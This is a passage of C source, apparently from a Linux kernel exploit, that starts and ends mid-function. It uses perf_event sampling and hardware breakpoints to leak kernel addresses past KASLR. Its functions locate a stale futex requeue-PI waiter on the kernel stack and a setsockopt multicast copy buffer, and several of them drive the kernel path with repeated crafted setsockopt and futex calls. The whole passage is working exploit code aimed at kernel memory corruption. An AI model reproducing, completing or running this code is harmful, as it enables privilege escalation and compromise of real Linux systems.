  void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE, MAP_SHARED,
                       perf_fd, 0);
  if (mapping == MAP_FAILED) {
    snprintf(perf_waiter_diag, sizeof(perf_waiter_diag),
             "mmap_fail errno=%d", errno);
    close(perf_fd);
    return 0;
  }

  struct perf_event_mmap_page *meta =
      (struct perf_event_mmap_page *)mapping;
  ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);

  uint64_t mcast_buffer[MCAST_OPT_LEN / 8] __attribute__((aligned(4096)));
  memset(mcast_buffer, 0, sizeof(mcast_buffer));
  mcast_buffer[1] = 2;
  mcast_buffer[0x88 / 8] = 2;
  socket_fd = (int)syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
  if (socket_fd >= 0) {
    for (int i = 0; i < GEOMETRY_LEAK_ITERS; i++) {
      (void)syscall(SYS_setsockopt, socket_fd, SOL_IP, 43, mcast_buffer,
                    MCAST_OPT_LEN);
    }
    close(socket_fd);
  }

  uint32_t pi_word = 0;
  for (int i = 0; i < GEOMETRY_LEAK_ITERS; i++) {
    (void)syscall(SYS_futex, &pi_word,
                  FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    (void)syscall(SYS_futex, &pi_word,
                  FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  }

  ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  const char *ring = (const char *)mapping + page_size;
  uint64_t ring_size = mapping_size - (size_t)page_size;
  uint64_t head = meta->data_head;
  __sync_synchronize();
  uint64_t tail = meta->data_tail;
  uint64_t waiter_candidates[32] = {0};
  unsigned waiter_counts[32] = {0};
  uint64_t copy_candidates[32] = {0};
  unsigned copy_counts[32] = {0};
  int waiter_candidate_count = 0;
  int copy_candidate_count = 0;
  int sample_count = 0;
  int futex_matches = 0;
  int setsockopt_matches = 0;
  int register_samples = 0;
  uint64_t debug_ips[16] = {0};
  unsigned debug_ip_counts[16] = {0};
  int debug_ip_count = 0;

  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t offset = tail & (ring_size - 1);
    struct perf_event_header header;
    if (offset + sizeof(header) <= ring_size) {
      memcpy(&header, ring + offset, sizeof(header));
    } else {
      uint64_t first = ring_size - offset;
      memcpy(&header, ring + offset, first);
      memcpy((char *)&header + first, ring, sizeof(header) - first);
    }
    if (header.size < 32 || tail + header.size > head) {
      break;
    }

    if (header.type == PERF_RECORD_SAMPLE) {
      sample_count++;
      uint64_t sample_offset = tail + sizeof(header);
      uint64_t ip = perf_ring_u64(ring, ring_size, sample_offset);
      int debug_index;
      for (debug_index = 0; debug_index < debug_ip_count; debug_index++) {
        if (debug_ips[debug_index] == ip) {
          debug_ip_counts[debug_index]++;
          break;
        }
      }
      if (debug_index == debug_ip_count && debug_ip_count < 16) {
        debug_ips[debug_ip_count] = ip;
        debug_ip_counts[debug_ip_count] = 1;
        debug_ip_count++;
      }
      uint64_t registers_offset = sample_offset + 8;
      uint64_t abi =
          perf_ring_u64(ring, ring_size, registers_offset);
      if (abi) {
        register_samples++;
        uint64_t frame_pointer =
            perf_ring_u64(ring, ring_size, registers_offset + 8);
        if (ip >= do_futex + 0x20 && ip < do_futex + 0x1800) {
          futex_matches++;
          geometry_add_candidate(
              waiter_candidates, waiter_counts, &waiter_candidate_count,
              frame_pointer + do_futex_waiter_off);
        } else if (ip >= do_ip_setsockopt + 0x20 &&
                   ip < do_ip_setsockopt + 0x1800) {
          setsockopt_matches++;
          geometry_add_candidate(
              copy_candidates, copy_counts, &copy_candidate_count,
              frame_pointer - 0x110);
        }
      }
    }
    tail += header.size;
  }

  meta->data_tail = head;
  munmap(mapping, mapping_size);
  close(perf_fd);

  unsigned waiter_best_count = 0;
  unsigned copy_best_count = 0;
  uint64_t waiter = geometry_best_candidate(
      waiter_candidates, waiter_counts, waiter_candidate_count,
      &waiter_best_count);
  perf_mcast_copy_address = geometry_best_candidate(
      copy_candidates, copy_counts, copy_candidate_count, &copy_best_count);

  if (waiter && perf_mcast_copy_address) {
    uint64_t measured_offset = waiter - perf_mcast_copy_address;
    if (measured_offset <= MCAST_OPT_LEN - (WAITER_LOCK_OFF + 8) &&
        !(measured_offset & 7)) {
      perf_mcast_waiter_offset = (int)measured_offset;
    }
  }

  snprintf(perf_waiter_diag, sizeof(perf_waiter_diag),
           "samples=%d regs=%d futex=%d mcast=%d do_futex_off=%#llx "
           "waiter=%016llx/n%u copy=%016llx/n%u delta=%#llx",
           sample_count, register_samples, futex_matches, setsockopt_matches,
           (unsigned long long)do_futex_waiter_off,
           (unsigned long long)waiter, waiter_best_count,
           (unsigned long long)perf_mcast_copy_address, copy_best_count,
           (unsigned long long)(waiter && perf_mcast_copy_address
                                    ? waiter - perf_mcast_copy_address
                                    : 0));
  pr_warning("perf geometry leak: tid=%u %s\n", (unsigned)mytid,
             perf_waiter_diag);
  for (int i = 0; i < debug_ip_count; i++) {
    pr_info("perf geometry ip[%d]=%016llx n=%u link=%016llx\n", i,
            (unsigned long long)debug_ips[i], debug_ip_counts[i],
            (unsigned long long)(debug_ips[i] - kaslr_slide));
  }
  return waiter;
}

static int mcast_probe_fd = -1;
static void *mcast_probe_mapping;
static size_t mcast_probe_mapping_size;
static int mcast_probe_page_size;

int perf_mcast_probe_begin(void) {
  perf_mcast_copy_address = 0;
  if (mcast_probe_fd >= 0) {
    return 0;
  }

  uint32_t mytid = (uint32_t)syscall(SYS_gettid);
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = GEOMETRY_PERF_TYPE_BREAKPOINT;
  pe.size = sizeof(pe);
  pe.config = 0;
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = 1ULL << GEOMETRY_SP_REG;
  pe.bp_type = GEOMETRY_BREAKPOINT_X;
  pe.bp_addr =
      SLIDE_DO_IP_SETSOCKOPT_IMAGE + kaslr_slide + 0x1048;
  pe.bp_len = GEOMETRY_BREAKPOINT_LEN_4;
  pe.disabled = 1;
  pe.exclude_user = 0;
  pe.exclude_hv = 0;

  int perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
  if (perf_fd < 0) {
    pr_warning("perf mcast probe open failed errno=%d tid=%u\n", errno,
               (unsigned)mytid);
    return 0;
  }

  int page_size = (int)sysconf(_SC_PAGESIZE);
  size_t mapping_size = (size_t)page_size * (GEOMETRY_RING_PAGES + 1);
  void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE, MAP_SHARED,
                       perf_fd, 0);
  if (mapping == MAP_FAILED) {
    pr_warning("perf mcast probe mmap failed errno=%d\n", errno);
    close(perf_fd);
    return 0;
  }

  mcast_probe_fd = perf_fd;
  mcast_probe_mapping = mapping;
  mcast_probe_mapping_size = mapping_size;
  mcast_probe_page_size = page_size;
  ioctl(mcast_probe_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(mcast_probe_fd, PERF_EVENT_IOC_ENABLE, 0);
  return 1;
}

uint64_t perf_mcast_probe_end(void) {
  if (mcast_probe_fd < 0) {
    return 0;
  }

  ioctl(mcast_probe_fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  struct perf_event_mmap_page *meta =
      (struct perf_event_mmap_page *)mcast_probe_mapping;
  const char *ring =
      (const char *)mcast_probe_mapping + mcast_probe_page_size;
  uint64_t ring_size =
      mcast_probe_mapping_size - (size_t)mcast_probe_page_size;
  uint64_t head = meta->data_head;
  __sync_synchronize();
  uint64_t tail = meta->data_tail;

  uint64_t candidates[32] = {0};
  unsigned counts[32] = {0};
  int candidate_count = 0;
  int sample_count = 0;
  int register_samples = 0;
  int matched_samples = 0;
  uint64_t debug_ips[64] = {0};
  unsigned debug_ip_counts[64] = {0};
  int debug_ip_count = 0;
  int do_ip_samples = 0;
  int ip_samples = 0;
  int sock_common_samples = 0;
  int udp_samples = 0;
  int sys_setsockopt_samples = 0;

  uint64_t do_ip = SLIDE_DO_IP_SETSOCKOPT_IMAGE + kaslr_slide;
  uint64_t ip = SLIDE_IP_SETSOCKOPT_IMAGE + kaslr_slide;
  uint64_t sock_common = SLIDE_SOCK_COMMON_SETSOCKOPT_IMAGE + kaslr_slide;
  uint64_t udp = SLIDE_UDP_SETSOCKOPT_IMAGE + kaslr_slide;
  uint64_t sys_setsockopt = SLIDE_SYS_SETSOCKOPT_IMAGE + kaslr_slide;

  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t offset = tail & (ring_size - 1);
    struct perf_event_header header;
    if (offset + sizeof(header) <= ring_size) {
      memcpy(&header, ring + offset, sizeof(header));
    } else {
      uint64_t first = ring_size - offset;
      memcpy(&header, ring + offset, first);
      memcpy((char *)&header + first, ring, sizeof(header) - first);
    }
    if (header.size < 32 || tail + header.size > head) {
      break;
    }

    if (header.type == PERF_RECORD_SAMPLE) {
      sample_count++;
      uint64_t sample_offset = tail + sizeof(header);
      uint64_t sample_ip =
          perf_ring_u64(ring, ring_size, sample_offset);
      int debug_index;
      for (debug_index = 0; debug_index < debug_ip_count; debug_index++) {
        if (debug_ips[debug_index] == sample_ip) {
          debug_ip_counts[debug_index]++;
          break;
        }
      }
      if (debug_index == debug_ip_count && debug_ip_count < 64) {
        debug_ips[debug_ip_count] = sample_ip;
        debug_ip_counts[debug_ip_count] = 1;
        debug_ip_count++;
      }

      uint64_t registers_offset = sample_offset + 8;
      uint64_t abi = perf_ring_u64(ring, ring_size, registers_offset);
      if (abi) {
        register_samples++;
        uint64_t sp =
            perf_ring_u64(ring, ring_size, registers_offset + 8);
        uint64_t copy_address = 0;
        if (sample_ip >= do_ip + 0x20 && sample_ip < do_ip + 0x1800) {
          do_ip_samples++;
          copy_address = sp + 0x20;
        } else if (sample_ip >= ip + 0x4 && sample_ip < ip + 0x80) {
          ip_samples++;
          copy_address = sp - 0x170;
        } else if (sample_ip >= sock_common + 0x4 &&
                   sample_ip < sock_common + 0x40) {
          sock_common_samples++;
          copy_address = sp - 0x1b0;
        } else if (sample_ip >= udp + 0x4 && sample_ip < udp + 0x1c4) {
          udp_samples++;
          copy_address = sp - 0x1a0;
        } else if (sample_ip >= sys_setsockopt + 0x4 &&
                   sample_ip < sys_setsockopt + 0x220) {
          sys_setsockopt_samples++;
          copy_address = sp - 0x1f0;
        }

        if (copy_address) {
          matched_samples++;
          geometry_add_candidate(candidates, counts, &candidate_count,
                                 copy_address);
        }
      }
    }
    tail += header.size;
  }

  meta->data_tail = head;
  munmap(mcast_probe_mapping, mcast_probe_mapping_size);
  close(mcast_probe_fd);
  mcast_probe_fd = -1;
  mcast_probe_mapping = NULL;
  mcast_probe_mapping_size = 0;
  mcast_probe_page_size = 0;

  unsigned best_count = 0;
  perf_mcast_copy_address = geometry_best_candidate(
      candidates, counts, candidate_count, &best_count);
  pr_info("perf mcast copy probe: samples=%d regs=%d matched=%d copy=%016llx "
          "n=%u path=[%d,%d,%d,%d,%d]\n",
          sample_count, register_samples, matched_samples,
          (unsigned long long)perf_mcast_copy_address, best_count,
          do_ip_samples, ip_samples, sock_common_samples, udp_samples,
          sys_setsockopt_samples);
  if (!perf_mcast_copy_address) {
    for (int i = 0; i < debug_ip_count; i++) {
      pr_info("perf mcast probe ip[%d]=%016llx n=%u link=%016llx\n", i,
              (unsigned long long)debug_ips[i], debug_ip_counts[i],
              (unsigned long long)(debug_ips[i] - kaslr_slide));
    }
  }
  return perf_mcast_copy_address;
}

static int wait_waiter_probe_fd = -1;
static void *wait_waiter_probe_mapping;
static size_t wait_waiter_probe_mapping_size;
static int wait_waiter_probe_page_size;

/* Sample the waiter thread while it is inside its own FUTEX_WAIT_REQUEUE_PI
 * syscall.  The kernel stack is 16 KiB and the stale waiter has a fixed place
 * below its top:
 *
 *   stack_top = align_up(any kernel SP, 0x4000)
 *   W         = stack_top - 0x380
 *
 * Every kernel sample from this TID observes the same stack, so the address is
 * stable even when the sampled instruction is in a futex helper or scheduler
 * path.  User-mode samples are ignored because their SP is not canonical
 * kernel memory. */
int perf_wait_waiter_probe_begin(void) {
  uint32_t mytid = (uint32_t)syscall(SYS_gettid);
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 1000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = 1ULL << GEOMETRY_SP_REG;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.wakeup_events = 1;

  int perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
  if (perf_fd < 0) {
    pr_warning("perf wait waiter probe open failed errno=%d tid=%u\n", errno,
               (unsigned)mytid);
    return 0;
  }

  int page_size = (int)sysconf(_SC_PAGESIZE);
  size_t mapping_size = (size_t)page_size * (GEOMETRY_RING_PAGES + 1);
  void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE, MAP_SHARED,
                       perf_fd, 0);
  if (mapping == MAP_FAILED) {
    pr_warning("perf wait waiter probe mmap failed errno=%d tid=%u\n", errno,
               (unsigned)mytid);
    close(perf_fd);
    return 0;
  }

  wait_waiter_probe_fd = perf_fd;
  wait_waiter_probe_mapping = mapping;
  wait_waiter_probe_mapping_size = mapping_size;
  wait_waiter_probe_page_size = page_size;
  ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
  return 1;
}

uint64_t perf_wait_waiter_probe_end(void) {
  if (wait_waiter_probe_fd < 0) {
    return 0;
  }

  ioctl(wait_waiter_probe_fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  struct perf_event_mmap_page *meta =
      (struct perf_event_mmap_page *)wait_waiter_probe_mapping;
  const char *ring =
      (const char *)wait_waiter_probe_mapping + wait_waiter_probe_page_size;
  uint64_t ring_size =
      wait_waiter_probe_mapping_size - (size_t)wait_waiter_probe_page_size;
  uint64_t head = meta->data_head;
  uint64_t tail = meta->data_tail;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  int candidate_count = 0;
  int sample_count = 0;
  int kernel_sp_samples = 0;
  int matched_count = 0;
  uint64_t debug_ips[16] = {0};
  unsigned debug_ip_counts[16] = {0};
  int debug_ip_count = 0;

  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t offset = tail & (ring_size - 1);
    struct perf_event_header header;
    memcpy(&header, ring + offset, sizeof(header));
    if (header.size < sizeof(header) || tail + header.size > head) {
      break;
    }
    if (header.type == PERF_RECORD_SAMPLE) {
      sample_count++;
      uint64_t sample_offset = tail + sizeof(header);
      uint64_t sample_ip = perf_ring_u64(ring, ring_size, sample_offset);
      int debug_index;
      for (debug_index = 0; debug_index < debug_ip_count; debug_index++) {
        if (debug_ips[debug_index] == sample_ip) {
          debug_ip_counts[debug_index]++;
          break;
        }
      }
      if (debug_index == debug_ip_count && debug_ip_count < 16) {
        debug_ips[debug_ip_count] = sample_ip;
        debug_ip_counts[debug_ip_count] = 1;
        debug_ip_count++;
      }
      uint64_t abi = perf_ring_u64(ring, ring_size, sample_offset + 8);
      if (abi) {
        uint64_t kernel_sp =
            perf_ring_u64(ring, ring_size, sample_offset + 16);
        if (kernel_sp >= 0xffffff8000000000ULL) {
          kernel_sp_samples++;
          uint64_t stack_top =
              (kernel_sp + SLIDE_THREAD_SIZE - 1) &
              ~(SLIDE_THREAD_SIZE - 1);
          uint64_t waiter = stack_top - SLIDE_WAITER_FROM_STACK_TOP;
          geometry_add_candidate(candidates, counts, &candidate_count, waiter);
          matched_count++;
        }
      }
    }
    tail += header.size;
  }

  meta->data_tail = head;
  munmap(wait_waiter_probe_mapping, wait_waiter_probe_mapping_size);
  close(wait_waiter_probe_fd);
  wait_waiter_probe_fd = -1;
  wait_waiter_probe_mapping = NULL;
  wait_waiter_probe_mapping_size = 0;
  wait_waiter_probe_page_size = 0;

  unsigned best_count = 0;
  uint64_t waiter =
      geometry_best_candidate(candidates, counts, candidate_count, &best_count);
  pr_info("perf wait probe: samples=%d kernel_sp=%d matched=%d "
          "waiter=%016llx/n%u\n",
          sample_count, kernel_sp_samples, matched_count,
          (unsigned long long)waiter, best_count);
  if (!waiter) {
    for (int i = 0; i < debug_ip_count; i++) {
      pr_info("perf wait probe ip[%d]=%016llx n=%u link=%016llx\n", i,
              (unsigned long long)debug_ips[i], debug_ip_counts[i],
              (unsigned long long)(debug_ips[i] - kaslr_slide));
    }
  }
  return waiter;
}

static int remove_waiter_probe_fd = -1;
static void *remove_waiter_probe_mapping;
static size_t remove_waiter_probe_mapping_size;
static int remove_waiter_probe_page_size;

int perf_remove_waiter_probe_begin(void) {
  uint32_t mytid = (uint32_t)syscall(SYS_gettid);
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_HARDWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_HW_CPU_CYCLES;
  /* CMP_REQUEUE_PI spends only a short time in remove_waiter().  At 10k
   * cycles the observed path produced single-digit sample counts, making the
   * x23 recovery stochastic.  The probe lifetime is one syscall, so 1k cycles
   * still fits comfortably in the 4 MiB ring. */
  pe.sample_period = 1000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.wakeup_events = 1;

  int perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
  if (perf_fd < 0) {
    pe.type = PERF_TYPE_SOFTWARE;
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
    if (perf_fd < 0) {
      pr_warning("perf remove_waiter probe open failed errno=%d tid=%u\n", errno,
                 (unsigned)mytid);
      return 0;
    }
  }

  int page_size = (int)sysconf(_SC_PAGESIZE);
  size_t mapping_size = (size_t)page_size * (GEOMETRY_RING_PAGES + 1);
  void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE, MAP_SHARED,
                       perf_fd, 0);
  if (mapping == MAP_FAILED) {
    close(perf_fd);
    return 0;
  }

  remove_waiter_probe_fd = perf_fd;
  remove_waiter_probe_mapping = mapping;
  remove_waiter_probe_mapping_size = mapping_size;
  remove_waiter_probe_page_size = page_size;
  ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
  return 1;
}

uint64_t perf_remove_waiter_probe_end(void) {
  if (remove_waiter_probe_fd < 0) {
    return 0;
  }

  ioctl(remove_waiter_probe_fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  struct perf_event_mmap_page *meta =
      (struct perf_event_mmap_page *)remove_waiter_probe_mapping;
  const char *ring =
      (const char *)remove_waiter_probe_mapping + remove_waiter_probe_page_size;
  uint64_t ring_size =
      remove_waiter_probe_mapping_size - (size_t)remove_waiter_probe_page_size;
  uint64_t head = meta->data_head;
  uint64_t tail = meta->data_tail;
  uint64_t remove_waiter = SLIDE_REMOVE_WAITER_IMAGE + kaslr_slide;
  uint64_t adjust_chain =
      SLIDE_RT_MUTEX_ADJUST_PRIO_CHAIN_IMAGE + kaslr_slide;
  uint64_t task_blocks =
      SLIDE_TASK_BLOCKS_ON_RT_MUTEX_IMAGE + kaslr_slide;
  uint64_t start_proxy_lock =
      SLIDE_RT_MUTEX_START_PROXY_LOCK_IMAGE + kaslr_slide;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  int candidate_count = 0;
  int sample_count = 0;
  int matched_count = 0;
  int register_dump_count = 0;
  uint64_t debug_ips[16] = {0};
  unsigned debug_counts[16] = {0};
  int debug_ip_count = 0;

  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t offset = tail & (ring_size - 1);
    struct perf_event_header header;
    memcpy(&header, ring + offset, sizeof(header));
    if (header.size < sizeof(header) || tail + header.size > head) {
      break;
    }
    if (header.type == PERF_RECORD_SAMPLE) {
      sample_count++;
      uint64_t sample_offset = tail + sizeof(header);
      uint64_t sample_ip = perf_ring_u64(ring, ring_size, sample_offset);
      uint64_t abi =
          perf_ring_u64(ring, ring_size, sample_offset + 8);
      int debug_index;
      for (debug_index = 0; debug_index < debug_ip_count; debug_index++) {
        if (debug_ips[debug_index] == sample_ip) {
          debug_counts[debug_index]++;
          break;
        }
      }
      if (debug_index == debug_ip_count && debug_ip_count < 16) {
        debug_ips[debug_ip_count] = sample_ip;
        debug_counts[debug_ip_count] = 1;
        debug_ip_count++;
      }
      if (abi) {
        uint64_t waiter = 0;
        if (sample_ip >= remove_waiter + 0x14 &&
            sample_ip < remove_waiter + 0x294) {
          waiter = perf_ring_u64(ring, ring_size, sample_offset + 200);
        } else if (sample_ip >= adjust_chain + 0x68 &&
                   sample_ip < adjust_chain + 0x854) {
          waiter = perf_ring_u64(ring, ring_size, sample_offset + 208);
        } else if (sample_ip >= start_proxy_lock + 0x18 &&
                   sample_ip < start_proxy_lock + 0x48) {
          waiter = perf_ring_u64(ring, ring_size, sample_offset + 176);
        } else if (sample_ip >= task_blocks + 0x50 &&
                   sample_ip < task_blocks + 0x404) {
          waiter = perf_ring_u64(ring, ring_size, sample_offset + 192);
        }
        if (waiter) {
          geometry_add_candidate(candidates, counts, &candidate_count, waiter);
          matched_count++;
        }
        if (sample_ip >= adjust_chain &&
            sample_ip < remove_waiter + 0x294) {
          if (register_dump_count < 8) {
            register_dump_count++;
            pr_info("perf rtmutex sample ip=%016llx link=%016llx regs:",
                    (unsigned long long)sample_ip,
                    (unsigned long long)(sample_ip - kaslr_slide));
            for (int reg = 0; reg < 31; reg++) {
              uint64_t value =
                  perf_ring_u64(ring, ring_size,
                                sample_offset + 16 + (uint64_t)reg * 8);
              if (value >= 0xffffff8000000000ULL && !(value & 7)) {
                pr_info(" x%d=%016llx", reg, (unsigned long long)value);
              }
            }
            pr_info("\n");
          }
        }
      }
    }
    tail += header.size;
  }

  meta->data_tail = head;
  munmap(remove_waiter_probe_mapping, remove_waiter_probe_mapping_size);
  close(remove_waiter_probe_fd);
  remove_waiter_probe_fd = -1;
  remove_waiter_probe_mapping = NULL;
  remove_waiter_probe_mapping_size = 0;
  remove_waiter_probe_page_size = 0;

  unsigned best_count = 0;
  uint64_t waiter = geometry_best_candidate(
      candidates, counts, candidate_count, &best_count);
  pr_info("perf remove_waiter probe: samples=%d matched=%d waiter=%016llx/n%u\n",
          sample_count, matched_count, (unsigned long long)waiter, best_count);
  for (int i = 0; i < debug_ip_count; i++) {
    pr_info("perf remove_waiter ip[%d]=%016llx n=%u link=%016llx\n", i,
            (unsigned long long)debug_ips[i], debug_counts[i],
            (unsigned long long)(debug_ips[i] - kaslr_slide));
  }
  return waiter;
}

uint64_t perf_probe_mcast_copy_address(uint64_t waiter_address) {
  uint32_t mytid = (uint32_t)syscall(SYS_gettid);
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_HARDWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_HW_CPU_CYCLES;
  pe.sample_period = 500;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID |
                   PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_REGS_INTR;
  pe.sample_max_stack = 16;
  pe.sample_regs_intr =
      (1ULL << 0) | (1ULL << 1) | (1ULL << GEOMETRY_SP_REG);
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.wakeup_events = 1;

  int perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
  if (perf_fd < 0) {
    pe.type = PERF_TYPE_SOFTWARE;
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 1000;
    perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
    if (perf_fd < 0) {
      pr_warning("perf mcast frame probe open failed errno=%d tid=%u\n", errno,
                 (unsigned)mytid);
      return 0;
    }
  }

  int page_size = (int)sysconf(_SC_PAGESIZE);
  size_t mapping_size = (size_t)page_size * (GEOMETRY_RING_PAGES + 1);
  void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE, MAP_SHARED,
                       perf_fd, 0);
  if (mapping == MAP_FAILED) {
    close(perf_fd);
    return 0;
  }

  struct perf_event_mmap_page *meta =
      (struct perf_event_mmap_page *)mapping;
  ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);

  int probe_page_size = (int)sysconf(_SC_PAGESIZE);
  unsigned char *probe_pages =
      mmap(NULL, (size_t)probe_page_size, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (probe_pages == MAP_FAILED) {
    munmap(mapping, mapping_size);
    close(perf_fd);
    return 0;
  }
  unsigned char *mcast_buffer = probe_pages;
  uint16_t af_inet = AF_INET;
  memset(mcast_buffer, 0, MCAST_OPT_LEN);
  memcpy(mcast_buffer + 0x08, &af_inet, sizeof(af_inet));
  int socket_fd = (int)syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
  if (socket_fd >= 0) {
    for (int i = 0; i < 1024; i++) {
      (void)syscall(SYS_setsockopt, socket_fd, SOL_IP, 43, mcast_buffer,
                    MCAST_OPT_LEN);
    }
    close(socket_fd);
  }
  munmap(probe_pages, (size_t)probe_page_size);

  ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  const char *ring = (const char *)mapping + page_size;
  uint64_t ring_size = mapping_size - (size_t)page_size;
  uint64_t head = meta->data_head;
  uint64_t tail = meta->data_tail;
  uint64_t candidates[32] = {0};
  unsigned counts[32] = {0};
  int candidate_count = 0;
  uint64_t stack_candidates[32] = {0};
  unsigned stack_counts[32] = {0};
  int stack_candidate_count = 0;
  int sample_count = 0;
  int matched_count = 0;
  uint64_t debug_ips[16] = {0};
  unsigned debug_counts[16] = {0};
  int debug_ip_count = 0;
  int debug_chain_count = 0;
  int source_hits = 0;
  uint64_t copy_low = waiter_address - MCAST_OPT_LEN;
  uint64_t probe_user_low = (uint64_t)(uintptr_t)probe_pages;
  uint64_t probe_user_high = probe_user_low + (uint64_t)probe_page_size;
  pr_info("perf mcast probe user=[%016llx,%016llx)\n",
          (unsigned long long)probe_user_low,
          (unsigned long long)probe_user_high);

  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t offset = tail & (ring_size - 1);
    struct perf_event_header header;
    memcpy(&header, ring + offset, sizeof(header));
    if (header.size < sizeof(header) || tail + header.size > head) {
      break;
    }
    if (header.type == PERF_RECORD_SAMPLE) {
      sample_count++;
      uint64_t sample_offset = tail + sizeof(header);
      uint64_t sample_ip = perf_ring_u64(ring, ring_size, sample_offset);
      uint32_t sample_tid =
          perf_ring_u32(ring, ring_size, sample_offset + 12);
      uint64_t chain_offset = sample_offset + 16;
      uint64_t chain_count =
          perf_ring_u64(ring, ring_size, chain_offset);
      uint64_t registers_offset =
          chain_offset + 8 + chain_count * sizeof(uint64_t);
      uint64_t abi =
          perf_ring_u64(ring, ring_size, registers_offset);
      int debug_index;
      for (debug_index = 0; debug_index < debug_ip_count; debug_index++) {
        if (debug_ips[debug_index] == sample_ip) {
          debug_counts[debug_index]++;
          break;
        }
      }
      if (debug_index == debug_ip_count && debug_ip_count < 16) {
        debug_ips[debug_ip_count] = sample_ip;
        debug_counts[debug_ip_count] = 1;
        debug_ip_count++;
      }
      if (abi && sample_tid == mytid) {
        uint64_t copy_destination =
            perf_ring_u64(ring, ring_size, registers_offset + 8);
        uint64_t copy_source =
            perf_ring_u64(ring, ring_size, registers_offset + 16);
        uint64_t stack_pointer =
            perf_ring_u64(ring, ring_size, registers_offset + 24);
        if (copy_source >= probe_user_low && copy_source < probe_user_high) {
          source_hits++;
          pr_info("perf mcast source hit x0=%016llx x1=%016llx ip=%016llx\n",
                  (unsigned long long)copy_destination,
                  (unsigned long long)copy_source,
                  (unsigned long long)sample_ip);
        }
        if (copy_destination >= copy_low &&
            copy_destination < waiter_address - 0x20 &&
            copy_source >= probe_user_low &&
            copy_source < probe_user_high) {
          geometry_add_candidate(candidates, counts, &candidate_count,
                                 copy_destination);
          matched_count++;
        }
        geometry_add_candidate(stack_candidates, stack_counts,
                               &stack_candidate_count, stack_pointer);
        if (debug_chain_count < 16) {
          debug_chain_count++;
          pr_info("perf mcast chain sp=%016llx x0=%016llx x1=%016llx "
                  "ip=%016llx nr=%llu",
                  (unsigned long long)stack_pointer,
                  (unsigned long long)copy_destination,
                  (unsigned long long)copy_source,
                  (unsigned long long)sample_ip,
                  (unsigned long long)chain_count);
          for (uint64_t frame = 0; frame < chain_count && frame < 8; frame++) {
            uint64_t address =
                perf_ring_u64(ring, ring_size,
                              chain_offset + 8 + frame * sizeof(uint64_t));
            pr_info(" c%llu=%016llx", (unsigned long long)frame,
                    (unsigned long long)address);
          }
          pr_info("\n");
        }
      }
    }
    tail += header.size;
  }

  meta->data_tail = head;
  munmap(mapping, mapping_size);
  close(perf_fd);

  unsigned best_count = 0;
  uint64_t copy_address = geometry_best_candidate(
      candidates, counts, candidate_count, &best_count);
  pr_info("perf mcast frame probe: samples=%d matched=%d copy=%016llx/n%u\n",
